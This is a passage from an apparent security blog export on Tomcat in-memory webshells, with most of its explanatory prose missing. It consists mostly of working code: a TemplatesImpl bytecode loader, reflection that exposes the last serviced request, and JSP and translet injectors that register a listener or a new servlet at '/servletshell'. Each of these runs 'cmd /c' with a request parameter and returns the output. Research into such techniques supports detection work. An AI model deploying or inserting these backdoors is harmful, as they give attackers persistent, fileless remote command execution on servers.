javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\">import javax.xml.transform.TransformerConfigurationException;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\">import java.util.Base64;</span><br><span class=\"line\"></span><br><span class=\"line\">public class ListenerShell extends HttpServlet&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">        String test=req.getParameter(&quot;test&quot;);</span><br><span class=\"line\">        byte[] bytecode= Base64.getDecoder().decode(test);</span><br><span class=\"line\">        byte[][] bytee= new byte[][]&#123;bytecode&#125;;</span><br><span class=\"line\">        TemplatesImpl templates=new TemplatesImpl();</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            setFildValue(templates,&quot;_bytecodes&quot;,bytee);</span><br><span class=\"line\">            setFildValue(templates,&quot;_name&quot;,&quot;Code&quot;);</span><br><span class=\"line\">            setFildValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class=\"line\">            templates.newTransformer();</span><br><span class=\"line\">        &#125; catch (TransformerConfigurationException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">        super.doGet(req, resp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void setFildValue(Object obj,String name,Object value) throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class=\"line\">        Field field=obj.getClass().getDeclaredField(name);</span><br><span class=\"line\">        field.setAccessible(true);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p> <code>TemplatesImpl</code> </p>\n<p>POC <code>lastServicedRequest</code> </p>\n<ul>\n<li> <code>request</code>  <code>response</code> <code>lastServicedRequest</code>  <code>lastServicedResponse</code> </li>\n<li> <code>request</code>  <code>lastServicedRequest</code> listener</li>\n</ul>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Echoinject extends AbstractTranslet &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            //WRAP_SAME_OBJECTtrue</span><br><span class=\"line\">            Class dispatcher = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;);</span><br><span class=\"line\">            Field WRAP_SAME_OBJECT = dispatcher.getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);</span><br><span class=\"line\">            WRAP_SAME_OBJECT.setAccessible(true);</span><br><span class=\"line\"></span><br><span class=\"line\">            //finalfinal</span><br><span class=\"line\">            Field modifiersField = WRAP_SAME_OBJECT.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class=\"line\">            modifiersField.setAccessible(true);</span><br><span class=\"line\">            modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class=\"line\">            if (!WRAP_SAME_OBJECT.getBoolean(null)) &#123;</span><br><span class=\"line\">                WRAP_SAME_OBJECT.setBoolean(null, true);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //lastServicedRequest</span><br><span class=\"line\">            Class filterchain = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;);</span><br><span class=\"line\">            Field lastServicedRequest = filterchain.getDeclaredField(&quot;lastServicedRequest&quot;);</span><br><span class=\"line\">            modifiersField = lastServicedRequest.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class=\"line\">            modifiersField.setAccessible(true);</span><br><span class=\"line\">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class=\"line\">            lastServicedRequest.setAccessible(true);</span><br><span class=\"line\">            if (lastServicedRequest.get(null) == null) &#123;</span><br><span class=\"line\">                lastServicedRequest.set(null, new ThreadLocal());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //lastServicedResponse</span><br><span class=\"line\">            Field lastServicedResponse = filterchain.getDeclaredField(&quot;lastServicedResponse&quot;);</span><br><span class=\"line\">            modifiersField = lastServicedResponse.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class=\"line\">            modifiersField.setAccessible(true);</span><br><span class=\"line\">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class=\"line\">            lastServicedResponse.setAccessible(true);</span><br><span class=\"line\">            if (lastServicedResponse.get(null) == null) &#123;</span><br><span class=\"line\">                lastServicedResponse.set(null, new ThreadLocal());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\">import org.apache.catalina.connector.Request;</span><br><span class=\"line\">import org.apache.catalina.connector.RequestFacade;</span><br><span class=\"line\">import org.apache.catalina.connector.Response;</span><br><span class=\"line\">import org.apache.catalina.core.ApplicationContext;</span><br><span class=\"line\">import org.apache.catalina.core.StandardContext;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.ByteArrayOutputStream;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.io.InputStream;</span><br><span class=\"line\">import java.util.ArrayList;</span><br><span class=\"line\">import java.util.Arrays;</span><br><span class=\"line\">import javax.servlet.ServletContext;</span><br><span class=\"line\">import javax.servlet.ServletRequest;</span><br><span class=\"line\">import javax.servlet.ServletRequestEvent;</span><br><span class=\"line\">import javax.servlet.ServletRequestListener;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\">import java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\">public class ListenerInject extends AbstractTranslet implements ServletRequestListener &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        //requestresponse</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Field context= null;</span><br><span class=\"line\">            context = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;).getDeclaredField(&quot;lastServicedRequest&quot;);</span><br><span class=\"line\">            context.setAccessible(true);</span><br><span class=\"line\">            ThreadLocal threadLocal=(ThreadLocal) context.get(null);</span><br><span class=\"line\">            ServletRequest request=null;</span><br><span class=\"line\">            if(threadLocal!=null&amp;&amp;threadLocal.get()!=null)&#123;</span><br><span class=\"line\">                request= (ServletRequest) threadLocal.get();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            if(request!=null)&#123;</span><br><span class=\"line\">                //context</span><br><span class=\"line\">                ServletContext servletContext=request.getServletContext();</span><br><span class=\"line\">                if(servletContext!=null)&#123;</span><br><span class=\"line\">                    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">                    appctx.setAccessible(true);</span><br><span class=\"line\">                    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">                    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">                    stdctx.setAccessible(true);</span><br><span class=\"line\">                    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">                    //listener</span><br><span class=\"line\">                    Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class=\"line\">                    List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class=\"line\">                    List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class=\"line\">                    listenerList.add(new ListenerInject());</span><br><span class=\"line\">                    standardContext.setApplicationEventListeners(listenerList.toArray());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">            requestf.setAccessible(true);</span><br><span class=\"line\">            Request request= (Request) requestf.get(test);</span><br><span class=\"line\">            Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">            String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            System.out.println(cmd);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>over</p>\n<h3 id=\"listener\"><a href=\"#listener\" class=\"headerlink\" title=\"listener\"></a>listener</h3><p><code>addApplicationEventListener</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">standardContext.addApplicationEventListener(new Testlistener());</span><br></pre></td></tr></table></figure>\n\n<p>jsp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.List&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Testlistener implements ServletRequestListener &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">                requestf.setAccessible(true);</span><br><span class=\"line\">                Request request= (Request) requestf.get(test);</span><br><span class=\"line\">                Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">                String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">                System.out.println(cmd);</span><br><span class=\"line\">                if(cmd!=null)&#123;</span><br><span class=\"line\">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                    byte[] b = new byte[1024];</span><br><span class=\"line\">                    int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                        baos.write(b, 0, a);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //StandardContext</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //listener</span><br><span class=\"line\">    standardContext.addApplicationEventListener(new Testlistener());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Tomcatservlet","date":"2023-06-09T15:11:27.000Z","excerpt":"Tomcatservlet","_content":"\n\n\n## \n\n\n\n## \n\nservletservletservlet\n\n\n\n\n\n\n\n`DefaultInstanceManager#newInstance`  `clazz` \n\n\n\n `clazz`  `StandardWrapper.servletClass` `StandardWrapperValve`  `context`  `StandardContext`  `children` \n\n\n\nwrapperservletservlet `StandardContext`  `addServlet` \n\n\n\n`ApplicationContext` \n\n\n\n `createWrapper`  `servlet`  `addChild`  `children` servletdemo\n\n```php\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //\n    String servletName=\"servletShell\";\n    String servletClass=\"servletShell.class\";\n    Class serletC=Servletshell.class;\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    //addServlet.setAccessible(true);\n    addServlet.invoke(applicationContext,servletName,serletC);\n    System.out.println(standardContext.findChildren());\n%>\n```\n\n\n\nservlet `children` \n\n\n\n `servlet-name`\n\n\n\n `addServletMapping` \n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //\n    String servletName=\"servletShell\";\n    String urlpattern=\"/servletshell\";\n    Class serletC=Servletshell.class;\n\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    addServlet.invoke(applicationContext,servletName,serletC);\n\n    Method addServletMapping=Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredMethod(\"addServletMapping\", String.class, String.class);\n    addServletMapping.invoke(standardContext,urlpattern,servletName);\n\n    System.out.println(standardContext.findChildren());\n%>\n```\n\n\n\n503503\n\nsb\n\n```auto\nif(state!=null){\n        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);\n    }\n```\n\n404\n\n\n\n 